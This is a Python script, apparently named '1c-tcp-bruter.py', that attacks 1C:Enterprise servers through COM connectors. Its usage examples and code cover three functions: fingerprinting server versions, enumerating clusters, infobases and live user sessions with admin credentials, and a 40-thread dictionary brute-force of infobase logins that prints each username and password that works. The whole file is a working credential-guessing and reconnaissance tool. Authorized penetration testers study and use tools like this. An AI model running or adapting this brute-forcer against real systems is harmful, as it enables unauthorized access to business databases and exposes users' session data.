#!/usr/bin/env python

import threading
from time import strftime
import queue as qqq
import socket
import timeit
import argparse
import ipaddress
import os

try:
    import pythoncom
    import win32com.client
except:
    print("No required module. Install https://github.com/mhammond/pywin32")
    exit()

# PARSING ARGS
parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, description='\t1C Tester',
                                 epilog='''
Examples:
Check versions of 1C client and server:
    python.exe 1c-tcp-bruter.py -t 10.4.3.2 -v 1

Gather information from 1C cluster:
    python.exe 1c-tcp-bruter.py -t 10.4.3.2 -i 1
    python.exe 1c-tcp-bruter.py -t 10.4.3.2 -i 1 -cp 1540 -U admin -P 123

Bruteforce:
    python.exe 1c-tcp-bruter.py -t 10.4.3.2 -b db2 -u users.txt -p pass_ru.txt

All:
    python.exe 1c-tcp-bruter.py -t 10.4.3.2 -b db2 -u users.txt -p pass_ru.txt -v 1 -i 1''')
parser.add_argument('-t', '--target', metavar='IP', type=str, help='The target server`s IP address')
parser.add_argument('-b', '--base', metavar='IB_name', type=str,
                    help='The name of information base in the 1C. ex: base3')
parser.add_argument('-u', '--userlist', metavar='userlist.txt', type=str, help='The username list')
parser.add_argument('-p', '--passlist', metavar='passlist.txt', type=str, help='The password list')
# parser.add_argument('-ch', '--clusterip', metavar='IP', type=str, help='Cluster`s IP address')
parser.add_argument('-v', '--version', metavar='[0, 1]', type=int,
                    help='Check versions of 1C client and server. Default: 0', default=0)
parser.add_argument('-cp', '--clusterport', metavar='Port', type=str, help='Cluster`s Port. Default: 1540.',
                    default='1540')
parser.add_argument('-i', '--info', metavar='[0, 1]', type=int, help='Gather information from 1C cluster. Default: 0',
                    default=0)
parser.add_argument('-U', '--user', metavar='user', type=str,
                    help='The username of 1C cluster`s administrator. Default: None', default='')
parser.add_argument('-P', '--password', metavar='pass', type=str,
                    help='The password of 1C cluster`s administrator. Default: None', default='')
# parser.add_argument("--delay", type=int, help='Time in milliseconds between each request', default=5)

args = parser.parse_args()
# END ARGS

# GLOBAL VARS
server = args.target
base = args.base
userfile = args.userlist
wordlist = args.passlist
# ipadrr = args.clusterip
checkv = args.version
port = args.clusterport
infoc = args.info
useradm = args.user
passadm = args.password
files = []
vfull = []
vshort = []
vpath = []
cluster = ['']
connects = ['']
sess = ['']
infobases = ['']


# END VARS

def search_1c():
    disk = os.environ['SYSTEMDRIVE']
    prfiles = ['Program Files', 'Program Files (x86)']
    dir1c = ['1cv8', '1cv81', '1cv82', '1cv83']
    # Search installed versions of 1C
    for i in prfiles:
        for j in dir1c:
            path = ''
            path = str(disk + "/" + i + "/" + j + "/")
            try:
                for (path, dirs, files) in os.walk(path):
                    for f in files:
                        if f == 'comcntr.dll':
                            # print(path)
                            vpath.append(str(path).replace('\\', '/'))
                            vfull.append(str(path.split('/')[3].split('\\')[0]))
                            vfull2 = path.split('/')[3].split('\\')[0]
                            vshort.append(str(vfull2.split('.')[0] + vfull2.split('.')[1]))
            except:
                continue
    # End searching


def installed_ver():
    print('\nInstalled versions on the host:')
    for q in range(0, len(vshort)):
        print(vfull[q] + '\t' + vpath[q])


def check_ver(platf, verser):
    global client
    if platf == '83':
        nover = 0
        for i in range(0, len(vshort)):
            if verser == vfull[i]:
                try:
                    agent = win32com.client.Dispatch("V83.COMConnector")
                except Exception as ex:
                    print(
                        '\nRegistered class of V83_COMConnector is not found. Create component `V83_COMConnector` using 1C client version `' + verser + '`. Manual `https://infostart.ru/public/400951/`.\n')
                    exit()
                try:
                    agentcon = agent.ConnectAgent(clusip)
                except Exception as ex:
                    print(
                        '\nDelete `V83_COMConnector` component and create component `V83_COMConnector` again using 1C client version `' + verser + '`. Manual `https://infostart.ru/public/400951/`.')
                    installed_ver()
                    exit()
            else:
                nover += 1
            if nover == len(vshort):
                print(
                    '\nThe required version of the 1C client is not installed. Install 1C client version `' + verser + '`. Delete `V83_COMConnector` component and create component `V83_COMConnector` again using 1C client version `' + verser + '`. Manual `https://infostart.ru/public/400951/`.')
                installed_ver()
                exit()
        client = platf

    if platf == '82':
        nover = 0
        for i in range(0, len(vshort)):
            if verser == vfull[i]:
                try:
                    agent = win32com.client.Dispatch("V82.COMConnector")
                except Exception as ex:
                    print(
                        '\nRegistered class of V82_COMConnector is not found. Create component `V82_COMConnector` using 1C client version `' + verser + '`. Manual `https://infostart.ru/public/400951/`.\n')
                    exit()
                try:
                    agentcon = agent.ConnectAgent(clusip)
                except Exception as ex:
                    print(
                        '\nDelete `V82_COMConnector` component and create component `V82_COMConnector` again using 1C client version `' + verser + '`. Manual `https://infostart.ru/public/400951/`.')
                    installed_ver()
                    exit()
            else:
                nover += 1
            if nover == len(vshort):
                print(
                    '\nThe required version of the 1C client is not installed. Install 1C client version `' + verser + '`. Delete `V82_COMConnector` component and create component `V82_COMConnector` again using 1C client version `' + verser + '`. Manual `https://infostart.ru/public/400951/`.')
                installed_ver()
                exit()
        client = platf

    if platf == '81':
        nover = 0
        for i in range(0, len(vshort)):
            if verser == vfull[i]:
                try:
                    agent = win32com.client.Dispatch("V81.COMConnector")
                except Exception as ex:
                    print(
                        '\nRegistered class of V81_COMConnector is not found. Create component `V81_COMConnector` using 1C client version `' + verser + '`. Manual `https://infostart.ru/public/400951/`.\n')
                    exit()
                try:
                    agentcon = agent.ConnectAgent(clusip)
                except Exception as ex:
                    print(
                        '\nDelete `V81_COMConnector` component and create component `V81_COMConnector` again using 1C client version `' + verser + '`. Manual `https://infostart.ru/public/400951/`.')
                    installed_ver()
                    exit()
            else:
                nover += 1
            if nover == len(vshort):
                print(
                    '\nThe required version of the 1C client is not installed. Install 1C client version `' + verser + '`. Delete `V81_COMConnector` component and create component `V81_COMConnector` again using 1C client version `' + verser + '`. Manual `https://infostart.ru/public/400951/`.')
                installed_ver()
                exit()
        client = platf
    # else:


# Starting version check:
def start_check():
    search_1c()
    try:
        agent = win32com.client.Dispatch("V83.COMConnector")
    except:
        print(
            '\nRegistered class of V83_COMConnector is not found. Create component `V83_COMConnector` using manual `https://infostart.ru/public/400951/`.\n')
        exit()

    try:
        agentcon = agent.ConnectAgent(clusip)
    except Exception as ex:
        error = str(ex).split('(')[2].split(", '")[2].split('=')[0]
        if error == 'server_addr':
            print('\nThe remote host `' + clusip + '` is not available. Check target`s IP address and/or port.\n')
            exit()
        versrv = str(ex).split('(')[3].split('),')[0].split('- ')[1]
        vercl = str(ex).split('(')[3].split('),')[0].split(' -')[0]
        print('\nTarget: ' + server + ':' + port)
        print('\r1C Server`s version is ' + versrv)
        ver = versrv.split('.')[0] + versrv.split('.')[1]

    # Check a version of 1C:
    if ver == '82':
        try:
            agent = win32com.client.Dispatch("V82.COMConnector")
        except Exception as ex82:
            print(
                '\nRegistered class of V82_COMConnector is not found. Create component `V82_COMConnector` using 1C client version `' + versrv + '`. Manual `https://infostart.ru/public/400951/`.\n')
            exit()
        check_ver(ver, versrv)

    elif ver == '83':
        if vercl == versrv:
            next
        else:
            try:
                agent = win32com.client.Dispatch("V83.COMConnector")
            except Exception as ex83:
                print(
                    '\nRegistered class of V83_COMConnector is not found. Create component `V83_COMConnector` using 1C client version `' + versrv + '`. Manual `https://infostart.ru/public/400951/`.\n')
                exit()
            check_ver(ver, versrv)

    elif ver == '81':
        try:
            agent = win32com.client.Dispatch("V81.COMConnector")
        except Exception as ex81:
            print(
                '\nRegistered class of V81_COMConnector is not found. Create component `V81_COMConnector` using 1C client version `' + versrv + '`. Manual `https://infostart.ru/public/400951/`.\n')
            exit()
        check_ver(ver, versrv)
    else:
        print('\nError!')
        print(ex)
        exit()


# End checking

def cluster_info():
    if client == '82':
        conn = win32com.client.Dispatch("V82.COMConnector")
    elif client == '83':
        conn = win32com.client.Dispatch("V83.COMConnector")
    elif client == '81':
        conn = win32com.client.Dispatch("V81.COMConnector")
    else:
        print('\nError! Use `-v 1` to check versions of 1C client and server. Use -h to see more.')

    agentcon = conn.ConnectAgent(clusip)
    cluster = agentcon.GetClusters()
    # print (cluster)
    # Check an authentication on the cluster
    flag = True
    for k in cluster:
        try:
            auth = agentcon.Authenticate(k, useradm, passadm)
            # print(auth)
            if flag == True:
                print('\nInformation about clusters:\nHostName;ClusterName;MainPort')
                flag = False
            print(k.HostName + ';' + k.Name + ';' + str(k.MainPort))
        except:
            print('\nCluster administrator authentication failed. Try with another credential.\n')
            exit()
    # End check

    print('\nInformation Bases:\nHostName;ClusterName;MainPort;InfoBaseName')
    for k in cluster:
        infobases = agentcon.GetInfoBases(k)
        for b in infobases:
            print(k.HostName + ';' + k.Name + ';' + str(k.MainPort) + ';' + b.Name)

    print('\nSessions:\nInfoBase;UserName;FromHost;License;LastActive')
    for k in cluster:
        infobases = agentcon.GetInfoBases(k)
        for b in infobases:
            sess = agentcon.GetInfoBaseSessions(k, b)
            # print(sess)
            if sess:
                # print(sess)
                for s in sess:
                    print(str(s.InfoBase.Name) + ';' + str(s.UserName) + ';' + str(s.Host) + ';' + str(
                        s.License.FullPresentation) + ';' + str(s.LastActiveAt))


class WorkerThread(threading.Thread):

    def __init__(self, queue, tid):
        threading.Thread.__init__(self)
        self.queue = queue
        self.tid = tid

    def run(self):
        global base
        global server
        pythoncom.CoInitialize()
        if client == '82':
            conn = win32com.client.Dispatch("V82.COMConnector")
        elif client == '83':
            conn = win32com.client.Dispatch("V83.COMConnector")
        elif client == '81':
            conn = win32com.client.Dispatch("V81.COMConnector")
        else:
            print('\nError! Use `-v 1` to check versions of 1C client and server. Use -h to see more.')
        while True:
            nextname = ''
            username = None
            try:
                username = self.queue.get(timeout=1)
            except     qqq.Empty:
                return
            try:
                for pas in passwordList:
                    start = timeit.default_timer()
                    if username == nextname:
                        continue
                    else:
                        CONSTR = 'Srvr="' + str(server) + '";Ref="' + str(base) + '";Usr="' + str(
                            username) + '";Pwd="' + str(pas) + '"'
                        # print(CONSTR)
                        try:
                            # conn = win32com.client.Dispatch("V82.COMConnector")
                            con1c = conn.Connect(CONSTR)
                            stop = timeit.default_timer()
                            print("[+] Login:" + str(username) + " Password:" + str(pas) + ' Time: ', stop - start)
                            nextname = username
                            agent.Quit()
                        # exit()
                        except Exception as ex:
                            # print(ex)
                            # stop = timeit.default_timer()
                            error = 1
                            # print("[-] Login:" + str(username) + " Password:" + str(pas) + " Fail" + ' Time: ', stop - start)
            except:
                raise

            self.queue.task_done()


# #Check the arguments:
if server == None:
    print('\nEnter the target`s IP address. Use -h to see more.\n')
    # parser.print_help()
    exit()

if server != None:
    try:
        ipaddress.ip_address(server)
    except ValueError:
        print('\nWrong target`s IP address. Check this argument.\n')
        exit()
    next

if int(port) >= 1 and int(port) <= 65535:
    next
else:
    print('\nWrong cluster`s port. Check this argument.\n')
    exit()

if checkv >= 0 and checkv <= 1:
    next
else:
    print('\nWrong argument. Use `0` or `1`.\n')
    exit()

if infoc >= 0 and infoc <= 1:
    next
else:
    print('\nWrong argument. Use `0` or `1`.\n')
    exit()
# End checking

clusip = server + ':' + port

# Mode selection
if clusip != None and checkv == 1 and infoc == 0 and (base == None or userfile == None or wordlist == None):
    # print('\nStart version check')
    start_check()
    installed_ver()
    print('\r')
    exit()
elif clusip != None and checkv == 0 and infoc == 1 and (base == None or userfile == None or wordlist == None):
    # print('\nStart cluster info')
    start_check()
    cluster_info()
    print('\r')
    exit()
elif clusip != None and checkv == 1 and infoc == 1 and (base == None or userfile == None or wordlist == None):
    # print('\nStart version check and cluster info')
    start_check()
    installed_ver()
    cluster_info()
    print('\r')
    exit()
elif (server != None and base != None and userfile != None and wordlist != None) and checkv == 0 and infoc == 0:
    # print('Start brute')
    start_check()
    next
elif (server != None and base != None and userfile != None and wordlist != None) and checkv == 1 and infoc == 0:
    # print('Start check and brute')
    start_check()
    installed_ver()
    next
elif (server != None and base != None and userfile != None and wordlist != None) and checkv == 0 and infoc == 1:
    # print('Start cluster info and brute')
    start_check()
    cluster_info()
    print('\r')
    next
elif (server != None and base != None and userfile != None and wordlist != None) and checkv == 1 and infoc == 1:
    # print('Start all')
    start_check()
    installed_ver()
    cluster_info()
    print('\r')
    next
elif (base == None or userfile == None or wordlist == None) and checkv == 0 and infoc == 0:  # nothing
    print(
        '\nEnter arguments `-b, -u, -p` to start bruteforce. Or enter `-v 1` to check versions of 1C, `-i 1` to gather information from 1C cluster. Use -h to see more.\n')
    exit()
else:
    parser.print_help()
    exit()
# End selection


usernameList = open(userfile, 'r').read().splitlines()
passwordList = open(wordlist, 'r').read().splitlines()

print("\nBruteforce started at " + strftime("%d-%m-%Y %H:%M:%S %Z") + "\n")
print("\rServer: " + str(server) + "   Infomation base: " + str(base) + "\n")

queue = qqq.Queue()
threads = []
cluster = []
for i in range(1, 40):  # Number of threads
    worker = WorkerThread(queue, i)
    worker.setDaemon(True)
    worker.start()
    threads.append(worker)
for username in usernameList:
    queue.put(username)  # Push usernames onto queue

queue.join()

# wait for all threads to exit

for item in threads:
    item.join()

# print("Testing Complete!")
print("\nBruteforce completed at " + strftime("%d-%m-%Y %H:%M:%S %Z") + "\n")